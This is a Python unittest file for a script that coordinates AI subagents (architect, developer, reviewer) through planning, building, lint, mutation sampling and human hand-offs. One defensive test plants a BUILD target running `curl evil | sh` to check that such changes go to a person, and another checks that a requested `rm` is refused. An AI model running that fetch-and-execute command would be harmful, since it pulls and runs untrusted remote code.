"""Tests for scripts/pipeline.py — the conductor driven through a small feature in a scratch repo.

Run: python3 -m unittest discover -s plugins/pipeline/tests
"""

import contextlib
import importlib.util
import io
import json
import re
import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import repo_fixture  # noqa: E402 — the repo config a scratch repo needs

SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "pipeline.py"
spec = importlib.util.spec_from_file_location("pipeline", SCRIPT)
pl = importlib.util.module_from_spec(spec)
sys.modules["pipeline"] = pl
spec.loader.exec_module(pl)

SPEC = """# Feature: demo

<!-- spec-check: v4 -->

## Intent and out of scope

**Primary goal**: a demo feature for the tests.

**Out of scope**: none.

**Excluded paths**: none

**Run**: here

**Area**: none

**Screens**: none

## Decisions

- D-1 (2026-11-25): Understood as a demo feature for the tests — confirmed at the kickoff.

## Scenarios

### SCENARIO-01 — First

Action: `A.First`
Size: large
Issue: #2

| Case | Kind | Given | Expect |
| --- | --- | --- | --- |
| 01.1 | happy | a thing | it works |
| 01.2 | error | a bad thing | it refuses |

### SCENARIO-02 — Second

Action: `A.Second`
Size: small
Issue: #3

| Case | Kind | Given | Expect |
| --- | --- | --- | --- |
| 02.1 | happy | a thing | it works |

## Links

- Feature issue: #1
"""
# The acceptance test each scenario's `Acceptance test:` line names once it is built.
ACCEPTANCE = {"SCENARIO-01": "`go/a_test.go` `Test_first`", "SCENARIO-02": "`go/b_test.go` `Test_second`"}
ISSUE = {"SCENARIO-01": 2, "SCENARIO-02": 3}
PLAN = """# SCENARIO-01: First

Size: OWNS A RUN — 4 batches, 1 package (services/a)
Cadence: code-first
Acceptance test: `go/a_test.go` `Test_first`
Narrow loop: `go test ./a/ -run First`
Mutation checks: none

### Acceptance (red)
- [{a}] Step 1: `a_test.go` `Test_first`, setup from `b_test.go:12` — covers 01.1

### Build
- [{b}] Step 2: one — covers 01.2
- [{b}] Step 3: two
- [{b}] Step 4: three
- [{c}] Step 5: four

### Sweep
- [{d}] Step 6: fix what lint reports

### Verify
- [{d}] Step 7: full gate, tick

## Handoff
"""
REVIEWER = '---\nname: test-reviewer\ntype: reviewer\ntriggers: ["**/*_test.go"]\n---\nbody\n'
METRICS = "| Scenario | Size |\n| --- | --- |\n\n## Final gate\n| Round | Reviewers run |\n| --- | --- |\n"


class Feature(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name).resolve() / "repo"
        self.projects = Path(self.tmp.name).resolve() / "projects"
        self.spec_dir = pl.spec_folder(self.root, "demo")
        self.spec = pl.spec_file(self.spec_dir)
        self.spec.parent.mkdir(parents=True)
        self.run_dir = pl.runs_of(self.spec_dir)
        # The plugin's agents (flat `<name>.md`, spawned as `pipeline:<name>`) apart from the repo's own
        # (`.claude/agents/<name>/Agent.md`, bare names): discovery must tell the two homes apart.
        self.plugin_agents = Path(self.tmp.name).resolve() / "plugin" / "agents"
        self.plugin_agents.mkdir(parents=True)
        (self.plugin_agents / "test-reviewer.md").write_text(REVIEWER)
        (self.root / ".claude" / "agents").mkdir(parents=True)
        repo_fixture.install(self.root)  # the repo config: read from the repo root, never beside the scripts
        # Reviewer discovery: the scratch plugin's and repo's agents only, not the real ones shipped with the scripts.
        self.own_agents = pl.OWN_AGENTS
        pl.OWN_AGENTS = self.plugin_agents
        self.spec.write_text(SPEC)
        # The sub-issues: their states as GitHub would give them, and the closes the pipeline asked for.
        self.states = {}
        self.closed = []
        self.real = (pl.ISSUE_STATES, pl.CLOSE_ISSUE)
        pl.ISSUE_STATES = lambda root, numbers: {n: self.states.get(n, "OPEN") for n in numbers if isinstance(n, int)}
        pl.CLOSE_ISSUE = lambda root, n, comment: self.closed.append((n, comment)) or ""
        (pl.runs_of(self.spec_dir) / "METRICS.md").write_text(METRICS)
        git = ["git", "-c", "user.name=t", "-c", "user.email=t@example.com"]
        subprocess.run([*git, "init", "-q", str(self.root)], check=True)
        subprocess.run([*git, "add", "-A"], cwd=self.root, check=True)
        subprocess.run([*git, "commit", "-qm", "init"], cwd=self.root, check=True)
        self.session = pl.project_dirs  # keep a reference so the prefix helper is exercised below
        common = pl.sh(self.root, "git", "rev-parse", "--path-format=absolute", "--git-common-dir").strip()
        prefix = "".join(c if c.isalnum() else "-" for c in str(Path(common).parent))
        self.subagents = self.projects / prefix / "session" / "subagents"
        self.subagents.mkdir(parents=True)
        self.cwd = os.getcwd()
        os.chdir(self.root)
        self.count = 0

    def tearDown(self):
        pl.ISSUE_STATES, pl.CLOSE_ISSUE = self.real
        pl.OWN_AGENTS = self.own_agents
        os.chdir(self.cwd)
        self.tmp.cleanup()

    def run_cli(self, *argv):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            old = sys.argv
            sys.argv = ["pipeline.py", *argv]
            try:
                code = pl.main()
            finally:
                sys.argv = old
        return code, out.getvalue()

    def next(self, *flags):
        return self.run_cli("next", "demo", "--projects-dir", str(self.projects), *flags)

    def agent_ran(self, agent, tag, final, handback=True):
        """Leave the transcript a finished `agent` run with this tag would leave."""
        self.count += 1
        transcript = self.subagents / f"agent-{self.count}.jsonl"
        report = ({"type": "tool_use", "name": "SubagentHandback", "input": {"message": final}} if handback
                  else {"type": "text", "text": final})
        lines = [
            {"type": "user", "message": {"content": f"{tag}\nBrief: /x — read it first."}},
            {"type": "assistant", "message": {"content": [{"type": "text", "text": "I'll start by reading the brief."}]}},
            {"type": "assistant", "message": {"content": [report]}},
            {"type": "user", "message": {"content": [{"type": "tool_result", "content": "delivered"}]}},
        ]
        transcript.write_text("\n".join(json.dumps(l) for l in lines))
        # Claude Code records the name the agent was spawned as: `pipeline:<name>` for the plugin's own.
        transcript.with_suffix(".meta.json").write_text(json.dumps({"agentType": pl.agent(agent)}))
        os.utime(transcript, (time.time() + 1, time.time() + 1))

    def state(self):
        return json.loads((pl.runs_of(self.spec_dir) / "PIPELINE.json").read_text())

    def write_plan(self, a=" ", b=" ", c=" ", d=" "):
        (pl.runs_of(self.spec_dir) / "SCENARIO-01.md").write_text(PLAN.format(a=a, b=b, c=c, d=d))

    def tick(self, unit):
        """The scenario built: its `Acceptance test:` line written and its sub-issue closed."""
        issue = f"Issue: #{ISSUE[unit]}\n"
        self.spec.write_text(self.spec.read_text().replace(issue, f"{issue}Acceptance test: {ACCEPTANCE[unit]}\n", 1))
        self.states[ISSUE[unit]] = "CLOSED"


class NextTest(Feature):
    def test_refuses_when_the_feature_has_no_specification(self):
        self.spec.unlink()

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("REFUSED", out)

    def test_asks_for_an_architect_when_a_normal_scenario_has_no_plan(self):
        code, out = self.next()

        self.assertEqual(code, 0)
        self.assertIn("run: plan unit: SCENARIO-01 feature: demo", out)
        self.assertIn("`pipeline:architect`", out)

    def test_the_cursor_and_the_plan_path_are_run_output_not_committed_files(self):
        _, out = self.next()

        self.assertTrue((self.root / ".runs" / "demo" / "PIPELINE.json").is_file())
        self.assertFalse((self.spec_dir / "PIPELINE.json").exists())
        brief = Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()
        self.assertIn(f"`{self.root / '.runs' / 'demo' / 'SCENARIO-01.md'}`", brief)

    def test_refuses_to_move_on_until_the_spawned_agent_has_run(self):
        self.next()

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("no finished run found for architect", out)

    def test_ignores_a_run_with_the_same_tag_from_another_agent(self):
        self.next()
        self.write_plan()
        self.agent_ran("developer", "run: plan unit: SCENARIO-01 feature: demo", "done")

        code, _ = self.next()

        self.assertEqual(code, 2)

    def test_takes_the_handed_back_report_not_the_agents_opening_words(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nState: red")

        self.next()

        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["report"], "## Phase report\nState: red")

    def test_takes_the_closing_text_of_a_run_with_no_hand_back(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nold style", handback=False)

        self.next()

        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["report"], "## Phase report\nold style")

    def test_a_longer_slug_with_the_same_prefix_is_another_feature(self):
        self.next()
        self.write_plan()
        self.agent_ran("architect", "run: plan unit: SCENARIO-01 feature: demo-two", "plan written")

        code, _ = self.next()

        self.assertEqual(code, 2)

    def test_stops_for_the_plan_review_before_any_developer_run(self):
        self.next()
        self.write_plan()
        self.agent_ran("architect", "run: plan unit: SCENARIO-01 feature: demo", "plan written")

        code, out = self.next()

        self.assertEqual(code, 0)
        self.assertIn("## Judge", out)
        self.assertNotIn("`pipeline:developer`", out)

    def test_a_plan_that_misses_a_case_goes_back_to_the_architect_once(self):
        self.next()
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace(" — covers 01.2", ""))
        self.agent_ran("architect", "run: plan unit: SCENARIO-01 feature: demo", "plan written")

        _, out = self.next()

        self.assertIn("stage: plan fix", out)
        self.assertIn("case(s) 01.2 of SCENARIO-01", Path(out.split("Brief: ")[1].split(" — ")[0]).read_text())
        self.agent_ran("architect", "run: plan unit: SCENARIO-01 feature: demo", "still not fixed")
        _, out = self.next()
        self.assertIn("plan-check still reports", out)
        self.assertIn("## Judge", out)

    def test_a_plan_owes_the_cases_of_a_scenario_folded_into_it(self):
        self.run_cli("fold", "demo", "SCENARIO-02", "SCENARIO-01")
        self.write_plan()

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 1)
        self.assertIn("case(s) 02.1 of SCENARIO-02", out)

    def test_plan_check_names_each_structural_gap(self):
        (pl.runs_of(self.spec_dir) / "SCENARIO-01.md").write_text(
            "# SCENARIO-01\n\nSize: OWNS A RUN — 7 batches, 1 package\nCadence: whenever\n"
            "Acceptance test: the first one\n\n### Build\n- [ ] Step 1: batch — covers 01.1, 01.2\n")

        _, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        for expected in ("`Mutation checks:` is missing", "`Narrow loop:` is missing", "must be `` `<test file>`", "must start with",
                         "no steps under `### Acceptance`", "no steps under `### Verify`", "declares 7 batches", "no `## Handoff`"):
            self.assertIn(expected, out)

    def test_test_only_build_steps_are_not_counted_as_batches(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace("### Sweep", "- [ ] Step 8: fault test\n- [ ] Step 9: bound test\n\n### Sweep"))

        code, _ = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 0)

    def test_a_case_covered_on_a_steps_sub_bullet_counts(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace("- [ ] Step 2: one — covers 01.2", "- [ ] Step 2: one\n  - `Test_refuses` — covers 01.2"))

        code, _ = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 0)

    def test_a_case_named_outside_a_step_is_not_covered(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace(" — covers 01.2", "") + "Note: Step 2 covers 01.2 in spirit.\n")
        self.assertIn("## Handoff\nNote", plan.read_text())

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 1)
        self.assertIn("01.2", out)

    def test_a_small_plan_owes_only_its_header_acceptance_step_and_cases(self):
        (pl.runs_of(self.spec_dir) / "SCENARIO-02.md").write_text(
            "# SCENARIO-02\n\nSize: OWNS A RUN — 1 batch, 1 workspace\nCadence: code-first\n"
            "Acceptance test: `p.test.tsx` `page › works`\nNarrow loop: `npm test`\nMutation checks: none\n\n"
            "### Acceptance (red)\n- [ ] Step 1: the test, setup from `q.test.tsx:8` — covers 02.1\n")

        code, _ = self.run_cli("plan-check", "demo", "SCENARIO-02")

        self.assertEqual(code, 0)

    def test_an_acceptance_step_that_names_no_source_test_for_its_setup_is_reported(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace(", setup from `b_test.go:12`", "") + "setup from `b_test.go:12`\n")

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 1)
        self.assertIn("names no `setup from", out)

    def test_a_setup_source_needs_a_test_file_and_line(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace("`b_test.go:12`", "`b.go:12`"))

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 1)
        self.assertIn("names no `setup from", out)

    def test_a_small_plan_owes_its_setup_source_too(self):
        (pl.runs_of(self.spec_dir) / "SCENARIO-02.md").write_text(
            "# SCENARIO-02\n\nSize: OWNS A RUN — 1 batch, 1 workspace\nCadence: code-first\n"
            "Acceptance test: `p.test.tsx` `page › works`\nNarrow loop: `npm test`\nMutation checks: none\n\n"
            "### Acceptance (red)\n- [ ] Step 1: the test — covers 02.1\n")

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-02")

        self.assertEqual(code, 1)
        self.assertIn("names no `setup from", out)

    def test_a_new_surface_may_say_it_has_no_setup_source(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace("setup from `b_test.go:12`", "setup from: none — no test drives `A` yet"))

        code, _ = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 0)

    def test_a_plan_that_says_it_has_no_setup_source_must_say_why(self):
        self.write_plan()
        plan = pl.runs_of(self.spec_dir) / "SCENARIO-01.md"
        plan.write_text(plan.read_text().replace("setup from `b_test.go:12`", "setup from: none"))

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual(code, 1)
        self.assertIn("names no `setup from", out)

    def test_a_sound_plan_passes_plan_check(self):
        self.write_plan()

        code, out = self.run_cli("plan-check", "demo", "SCENARIO-01")

        self.assertEqual((code, out.strip()), (0, "plan-check: SCENARIO-01 OK"))

    def test_the_first_run_is_told_it_writes_the_test_and_later_runs_that_it_is_locked(self):
        self.planned()
        _, out = self.next("--plan-ok")
        self.assertIn("You write the acceptance test", Path(out.split("Brief: ")[1].split(" — ")[0]).read_text())
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")

        _, out = self.next()

        self.assertIn("is locked", Path(out.split("Brief: ")[1].split(" — ")[0]).read_text())

    def to_last_run(self, production: bool):
        """Plan, run 1 (acceptance), run 2 (steps 2-4); return the brief of the run after it."""
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")
        self.next()
        if production:
            (self.root / "go" / "services").mkdir(parents=True, exist_ok=True)
            (self.root / "go" / "services" / "a.go").write_text("package a\n")
        self.write_plan(a="x", b="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nbuilt")
        _, out = self.next()
        return Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()

    def sample_says(self, text):
        original, calls = pl.mutation, []
        pl.mutation = lambda root, base, to, limit=None, surface="": calls.append(surface) or text
        self.addCleanup(setattr, pl, "mutation", original)
        return calls

    def test_the_last_build_batches_and_the_sweep_share_one_run(self):
        self.sample_says("")

        brief = self.to_last_run(production=False)

        self.assertIn("Build: steps 5, then Sweep + Verify", brief)
        self.assertIn("This is the scenario's last run.", brief)

    def test_no_sample_before_any_build_step_is_ticked(self):
        calls = self.sample_says("Survivors")
        self.planned()
        self.next("--plan-ok")
        (self.root / "go" / "services").mkdir(parents=True, exist_ok=True)
        (self.root / "go" / "services" / "a.go").write_text("package a\n")
        (pl.runs_of(self.spec_dir) / "SCENARIO-01.md").write_text(PLAN.format(a="x", b=" ", c=" ", d=" ").replace(
            "- [ ] Step 3: two\n- [ ] Step 4: three\n", "").replace(
            "### Acceptance (red)", "### Scaffold\n- [x] Step 0: stub the new symbol\n\n### Acceptance (red)"))
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")

        self.next()

        self.assertEqual([], calls)

    def test_the_last_run_carries_the_mutation_survivors_of_the_scenario_so_far(self):
        calls = self.sample_says("**Mutation sample** 8 mutants\n\nSurvivors (a surviving `guard` is a MAJOR candidate):\n\n- `go/services/a.go:3` guard")

        brief = self.to_last_run(production=True)

        self.assertEqual(["go"], calls)
        self.assertIn("## Mutation sample of this scenario so far — before you tick", brief)
        self.assertIn("`go/services/a.go:3` guard", brief)

    def test_a_sample_with_no_survivor_adds_nothing_to_the_last_run(self):
        self.sample_says("**Mutation sample** 8 mutants — 8 killed, 0 survived")

        brief = self.to_last_run(production=True)

        self.assertNotIn("Mutation sample of this scenario so far", brief)

    def test_no_production_change_means_no_sample(self):
        calls = self.sample_says("Survivors")

        self.to_last_run(production=False)

        self.assertEqual([], calls)

    def lint_says(self, *answers):
        """Make the acceptance-test linter answer each call in turn ("" is clean)."""
        replies = iter(answers)
        original = pl.acceptance_lint
        pl.acceptance_lint = lambda root, line: next(replies, "")
        self.addCleanup(setattr, pl, "acceptance_lint", original)

    def test_a_first_run_whose_acceptance_test_fails_lint_goes_again_before_the_lock(self):
        self.planned()
        self.next("--plan-ok")
        self.lint_says("a_test.go:12:2: G101: Potential hardcoded credentials (gosec)")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")

        _, out = self.next()

        brief = Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()
        self.assertEqual(0, self.state()["scenarios"]["SCENARIO-01"]["runs"])
        self.assertIn("Lint findings in the acceptance test — fix before it locks", brief)
        self.assertIn("G101: Potential hardcoded credentials", brief)
        self.assertIn("You write the acceptance test", brief)
        self.assertNotIn("is locked", brief)

    def test_the_lock_engages_after_one_lint_retry_even_if_lint_still_fails(self):
        self.planned()
        self.next("--plan-ok")
        self.lint_says("still failing", "still failing")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")
        self.next()
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nlint fixed")

        _, out = self.next()

        self.assertEqual(1, self.state()["scenarios"]["SCENARIO-01"]["runs"])
        self.assertIn("is locked", Path(out.split("Brief: ")[1].split(" — ")[0]).read_text())

    def test_a_blocked_first_run_is_not_linted_or_held_back(self):
        self.planned()
        self.next("--plan-ok")
        self.lint_says("a_test.go:3:1: would fail lint")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "BLOCKED: needs docker\n\nmore")

        code, out = self.next()

        self.assertEqual((2, 1), (code, self.state()["scenarios"]["SCENARIO-01"]["runs"]))
        self.assertIn("BLOCKED: needs docker", out)
        self.assertNotIn("acceptance_lint", self.state()["scenarios"]["SCENARIO-01"])

    def test_a_lint_clean_acceptance_test_locks_after_the_first_run(self):
        self.planned()
        self.next("--plan-ok")
        self.lint_says("")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")

        self.next()

        self.assertEqual(1, self.state()["scenarios"]["SCENARIO-01"]["runs"])

    def test_an_unlocked_test_is_named_in_the_next_build_brief_with_the_reason_it_was_unlocked(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")
        self.next()
        self.assertEqual(self.stalled_run("BLOCKED: the locked test never closes its memorykv\n\nmore")[0], 2)
        self.run_cli("unlock", "demo", "SCENARIO-01")

        _, out = self.next()

        brief = Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()
        self.assertIn("is **unlocked** and may be edited", brief)
        self.assertIn("BLOCKED: the locked test never closes its memorykv", brief)
        self.assertIn("*A locked acceptance test that is wrong*", brief)
        self.assertNotIn("is locked", brief)

    def test_refuses_when_the_architect_wrote_no_plan(self):
        self.next()
        self.agent_ran("architect", "run: plan unit: SCENARIO-01 feature: demo", "FOLD into SCENARIO-02")

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("wrote no SCENARIO-01.md", out)

    def planned(self):
        self.next()
        self.write_plan()
        self.agent_ran("architect", "run: plan unit: SCENARIO-01 feature: demo", "plan written")
        self.next()

    def test_first_developer_run_covers_scaffold_and_acceptance_only(self):
        self.planned()

        code, out = self.next("--plan-ok")

        self.assertIn("run: build unit: SCENARIO-01 feature: demo", out)
        self.assertIn("Scaffold + Acceptance (red): steps 1", out)
        self.assertIsNotNone(self.state()["scenarios"]["SCENARIO-01"]["pre"])

    def test_a_build_run_takes_at_most_three_batches_and_carries_the_last_phase_report(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo",
                       "notes\n## Phase report — SCENARIO-01 run 1\nState: acceptance test red")

        code, out = self.next()

        self.assertIn("Build: steps 2, 3, 4", out)
        self.assertNotIn("steps 2, 3, 4, 5", out)
        brief = Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()
        self.assertIn("State: acceptance test red", brief)
        self.assertNotIn("notes", brief)
        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["runs"], 1)

    def stalled_run(self, reply="## Phase report\nChanged: nothing this run. I didn't tick the steps."):
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", reply)
        return self.next()

    def test_two_runs_that_tick_nothing_stop_the_scenario_instead_of_launching_a_third(self):
        self.planned()
        self.next("--plan-ok")

        first, out1 = self.stalled_run()
        second, out2 = self.stalled_run()

        self.assertEqual(first, 0)
        self.assertIn("`pipeline:developer`", out1)
        self.assertEqual(second, 2)
        self.assertIn("2 developer runs in a row on SCENARIO-01 ticked no step", out2)
        self.assertIsNone(self.state()["pending"])

    def test_after_the_stall_is_reported_once_the_next_call_carries_on(self):
        self.planned()
        self.next("--plan-ok")
        self.stalled_run()
        self.stalled_run()
        self.write_plan(a="x")  # a person ticked the step whose work was on disk

        code, out = self.next()

        self.assertEqual(code, 0)
        self.assertIn("Build: steps 2, 3, 4", out)

    def test_a_run_that_ticks_a_step_clears_the_stall_count(self):
        self.planned()
        self.next("--plan-ok")
        self.stalled_run()
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred seen")
        self.next()

        code, _ = self.stalled_run()

        self.assertEqual(code, 0)
        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["stalls"], 1)

    def test_doing_nothing_about_a_stall_costs_one_more_run_not_two(self):
        self.planned()
        self.next("--plan-ok")
        self.stalled_run()
        self.stalled_run()
        self.next()

        code, out = self.stalled_run()

        self.assertEqual(code, 2)
        self.assertIn("ticked no step", out)

    def test_unticking_and_reticking_a_step_is_not_progress(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred seen")
        self.next()
        self.write_plan()            # a run unticks the step
        self.stalled_run()
        self.write_plan(a="x")       # the next ticks it back

        code, out = self.stalled_run()

        self.assertEqual(code, 2)
        self.assertIn("ticked no step", out)

    def test_a_cursor_from_before_the_guard_resumes_with_its_pending_run(self):
        self.planned()
        self.next("--plan-ok")
        cursor = pl.runs_of(self.spec_dir) / "PIPELINE.json"
        state = json.loads(cursor.read_text())
        del state["pending"]["ticked"]
        state["scenarios"]["SCENARIO-01"]["runs"] = 80
        cursor.write_text(json.dumps(state))

        code, out = self.stalled_run()

        self.assertEqual(code, 0)
        self.assertIn("`pipeline:developer`", out)
        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["stalls"], 0)

    @mock.patch.object(pl, "CHECKPOINT", True)
    def test_a_blocked_fix_pass_is_not_recorded_as_done(self):
        self.built()
        self.next()
        self.agent_ran("test-reviewer", "run: checkpoint unit: SCENARIO-01 feature: demo", "[MAJOR] go/a_test.go:1 — vacuous")
        self.next()
        self.agent_ran("developer", "run: checkpoint-fix unit: SCENARIO-01 feature: demo", "BLOCKED: docker is down")

        code, out = self.next()

        self.assertEqual(code, 2)
        self.assertIn("fix pass on SCENARIO-01 is blocked", out)
        self.assertFalse(self.state()["scenarios"]["SCENARIO-01"]["done"])

    def test_blocked_must_be_the_briefs_own_form(self):
        self.planned()
        self.next("--plan-ok")

        code, _ = self.stalled_run("Blocked-free: nothing stood in the way, but I ticked nothing")

        self.assertEqual(code, 0)

    def test_a_blocked_reply_stops_after_one_run(self):
        self.planned()
        self.next("--plan-ok")

        code, out = self.stalled_run("BLOCKED: the sandbox refuses to bind a local port\n\ndetails")

        self.assertEqual(code, 2)
        self.assertIn("is blocked — BLOCKED: the sandbox refuses to bind a local port", out)
        self.assertEqual(Path(self.state()["scenarios"]["SCENARIO-01"]["last_reply"]).read_text().splitlines()[0],
                         "BLOCKED: the sandbox refuses to bind a local port")

    def test_an_environment_note_is_remembered_and_can_be_cleared(self):
        self.planned()
        _, out = self.next("--plan-ok", "--env-note", "unattended run")
        self.assertIn("- Environment: unattended run", Path(out.split("Brief: ")[1].split(" — ")[0]).read_text())
        self.write_plan(a="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\nred")

        _, kept = self.next()
        self.write_plan(a="x", b="x")
        self.agent_ran("developer", "run: build unit: SCENARIO-01 feature: demo", "## Phase report\ngreen")
        _, cleared = self.next("--env-note", "")

        self.assertIn("Environment: unattended run", Path(kept.split("Brief: ")[1].split(" — ")[0]).read_text())
        self.assertNotIn("Environment:", Path(cleared.split("Brief: ")[1].split(" — ")[0]).read_text())

    def test_a_developer_asking_for_codegen_gets_it_run_and_its_run_started_again(self):
        self.planned()
        self.next("--plan-ok")

        code, out = self.stalled_run("RUNNER: codegen\n\nI edited protos/core/x.proto and cannot regenerate here.")

        self.assertEqual(code, 0)
        self.assertIn("    heph run codegen //...", out)
        self.assertEqual((pl.ACTION["kind"], pl.ACTION["command"]), ("run", ["heph", "run", "codegen", "//..."]))
        self.assertEqual(self.state()["scenarios"]["SCENARIO-01"]["stalls"], 0)
        _, out = self.next("--ran", "codegen ok")
        brief = Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()
        self.assertIn("## Run for you since your last run\n\ncodegen ok After a codegen, grep both", brief)
        self.assertIn("Scaffold + Acceptance", brief)

    def test_a_request_stays_owed_until_its_outcome_is_given(self):
        self.planned()
        self.next("--plan-ok")
        self.stalled_run("RUNNER: codegen")

        code, out = self.next()   # e.g. the runner was killed after running it

        self.assertEqual(code, 0)
        self.assertIn("    heph run codegen //...", out)
        self.assertNotIn("`pipeline:developer`", out)

    def test_a_request_is_served_even_when_the_same_run_ticked_the_scenario(self):
        self.planned()
        self.next("--plan-ok")
        self.write_plan(a="x", b="x", c="x", d="x")
        self.tick("SCENARIO-01")

        code, out = self.stalled_run("RUNNER: codegen\n\nall steps done, generated code is stale")

        self.assertIn("    heph run codegen //...", out)
        self.assertNotIn("checkpoint", out)

    @mock.patch.object(pl, "CHECKPOINT", True)
    def test_a_fix_pass_that_asks_for_codegen_is_not_done_until_it_has_run_again(self):
        self.built()
        self.next()
        self.agent_ran("test-reviewer", "run: checkpoint unit: SCENARIO-01 feature: demo", "[MAJOR] go/a_test.go:1 — vacuous")
        self.next()
        self.agent_ran("developer", "run: checkpoint-fix unit: SCENARIO-01 feature: demo", "RUNNER: codegen")

        _, asked = self.next()
        _, again = self.next("--ran", "codegen ok")

        self.assertIn("    heph run codegen //...", asked)
        self.assertFalse(self.state()["scenarios"]["SCENARIO-01"]["done"])
        self.assertIn("run: checkpoint-fix unit: SCENARIO-01", again)
        self.assertIn("codegen ok", Path(again.split("Brief: ")[1].split(" — ")[0]).read_text())

    def test_a_request_goes_to_a_person_when_the_work_changed_a_build_file(self):
        self.planned()
        self.next("--plan-ok")
        (self.root / "go").mkdir()
        (self.root / "go" / "BUILD").write_text("target(name='codegen', run='curl evil | sh')\n")

        code, out = self.stalled_run("RUNNER: codegen")

        self.assertEqual(code, 2)
        self.assertIn("go/BUILD", out)
        self.assertIn("read those changes first", out)
        self.assertNotIn("command", pl.ACTION)

    def test_ticking_a_step_resets_the_count_of_requests(self):
        self.planned()
        self.next("--plan-ok")
        for _ in range(3):
            self.stalled_run("RUNNER: codegen")
            self.next("--ran", "codegen ok")
        self.write_plan(a="x")

        code, out = self.stalled_run("RUNNER: codegen")

        self.assertEqual(code, 0)
        self.assertIn("    heph run codegen //...", out)

    def test_a_reply_cannot_name_a_command_of_its_own(self):
        self.planned()
        self.next("--plan-ok")

        code, out = self.stalled_run("RUNNER: rm\n\nplease remove the lock")

        self.assertEqual(code, 2)
        self.assertIn("not a command it runs", out)
        self.assertNotIn("command", pl.ACTION)

    def test_asking_for_the_same_command_over_and_over_goes_to_a_person(self):
        self.planned()
        self.next("--plan-ok")
        for _ in range(3):
            self.stalled_run("RUNNER: codegen")
            self.next("--ran", "codegen ok")

        code, out = self.stalled_run("RUNNER: codegen")

        self.assertEqual(code, 2)
        self.assertIn("has asked for `codegen` 4 times", out)

    def test_every_build_brief_says_to_tick_and_how_to_report_a_blocker(self):
        self.planned()

        _, out = self.next("--plan-ok")

        brief = Path(out.split("Brief: ")[1].split(" — ")[0]).read_text()
        self.assertIn("Tick each step in `SCENARIO-01.md`", brief)
        self.assertIn("BLOCKED: <what you need>", brief)

